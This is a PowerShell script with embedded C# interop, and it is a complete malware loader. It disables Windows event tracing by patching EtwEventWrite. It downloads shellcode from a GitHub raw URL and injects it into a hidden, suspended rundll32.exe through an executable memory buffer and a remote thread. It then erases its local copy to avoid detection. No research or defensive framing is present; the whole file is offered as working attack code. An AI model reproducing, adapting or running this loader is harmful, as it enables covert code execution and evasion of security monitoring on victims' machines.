function Write-Timestamp {
    $t = Get-Date -Format "HH:mm:ss.fff"
    Write-Host "[$t] $($args[0])"
}

#region P/Invoke definitions via C#
$Win32 = @'
using System;
using System.Runtime.InteropServices;

public static class Win32
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr GetModuleHandleW(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOW lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    private struct STARTUPINFOW
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwSizeX;
        public int dwSizeY;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static PROCESS_INFORMATION CreateSuspendedProcess(string imagePath)
    {
        var si = new STARTUPINFOW();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFOW));
        si.dwFlags = 0x00000001;  // STARTF_USESHOWWINDOW
        si.wShowWindow = 0;        // SW_HIDE

        PROCESS_INFORMATION pi;
        bool ok = CreateProcessW(
            null, imagePath,
            IntPtr.Zero, IntPtr.Zero,
            false,
            0x00000004,             // CREATE_SUSPENDED
            IntPtr.Zero, null,
            ref si, out pi);

        if (!ok)
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(),
                "CreateProcessW failed");

        return pi;
    }
}

public static class NtDll
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref uint RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint BufferSize,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);
}
'@

Write-Timestamp "Compiling P/Invoke definitions"
Add-Type -TypeDefinition $Win32

# --- Step 1: Patch ETW via VirtualProtect ---
Write-Timestamp "Patching ETW (EtwEventWrite -> ret)"

$ntdll = [Win32]::GetModuleHandleW("ntdll.dll")
$etwPtr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
$oldProtect = 0
[Win32]::VirtualProtect($etwPtr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etwPtr, 0xC3)
[Win32]::VirtualProtect($etwPtr, [UIntPtr]::new(1), $oldProtect, [ref]$null) | Out-Null

# --- Step 2: Retrieve shellcode into temp heap variable ---
Write-Timestamp "Downloading shellcode into heap variable"

$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData("https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin")

if (-not $shellcode -or $shellcode.Length -eq 0) {
    throw "Downloaded shellcode is empty"
}

# --- Step 3: Spawn hidden 32-bit host process ---
Write-Timestamp "Spawning hidden 32-bit process"

$pi = [Win32]::CreateSuspendedProcess("C:\Windows\SysWOW64\rundll32.exe")

# --- Step 4: NtAllocateVirtualMemory (RWX) ---
Write-Timestamp "Allocating remote RWX buffer via NtAllocateVirtualMemory"

$baseAddr = [IntPtr]::Zero
$regionSize = [uint32]$shellcode.Length
$status = [NtDll]::NtAllocateVirtualMemory(
    $pi.hProcess,
    [ref]$baseAddr,
    [IntPtr]::Zero,
    [ref]$regionSize,
    0x3000,   # MEM_COMMIT | MEM_RESERVE
    0x40)     # PAGE_EXECUTE_READWRITE

if ($status -ne 0) {
    throw "NtAllocateVirtualMemory failed with status 0x$('{0:X8}' -f $status)"
}

# --- Step 5: NtWriteVirtualMemory ---
Write-Timestamp "Writing shellcode via NtWriteVirtualMemory"

$bytesWritten = 0
$status = [NtDll]::NtWriteVirtualMemory(
    $pi.hProcess,
    $baseAddr,
    $shellcode,
    [uint32]$shellcode.Length,
    [ref]$bytesWritten)

if ($status -ne 0) {
    throw "NtWriteVirtualMemory failed with status 0x$('{0:X8}' -f $status)"
}

# --- Step 6: NtCreateThreadEx ---
Write-Timestamp "Triggering execution via NtCreateThreadEx"

$hThread = [IntPtr]::Zero
$status = [NtDll]::NtCreateThreadEx(
    [ref]$hThread,
    0x001FFFFF,       # THREAD_ALL_ACCESS
    [IntPtr]::Zero,
    $pi.hProcess,
    $baseAddr,
    [IntPtr]::Zero,
    $false,            # createSuspended
    0, 0, 0,
    [IntPtr]::Zero)

if ($status -ne 0) {
    throw "NtCreateThreadEx failed with status 0x$('{0:X8}' -f $status)"
}

# --- Step 7: Erase local memory footprint ---
Write-Timestamp "Erasing local shellcode copy and forcing GC"

$shellcode = $null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Write-Timestamp "Done"
